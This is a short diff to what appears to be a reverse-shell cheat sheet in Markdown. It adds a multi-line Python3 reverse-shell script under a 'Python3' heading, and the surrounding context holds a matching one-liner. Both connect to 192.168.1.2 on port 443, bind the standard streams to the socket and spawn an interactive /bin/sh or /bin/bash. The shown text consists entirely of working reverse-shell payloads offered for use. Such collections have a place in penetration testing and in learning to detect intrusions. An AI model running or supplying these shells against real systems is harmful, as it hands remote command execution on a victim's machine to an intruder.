@@ -381,6 +381,21 @@
   ```
 
   # <kbd>Python3</kbd>
+   
+  ```cmd
+  #!/usr/bin/python3
+
+import os
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.2",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+  ```
 
   ```cmd
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
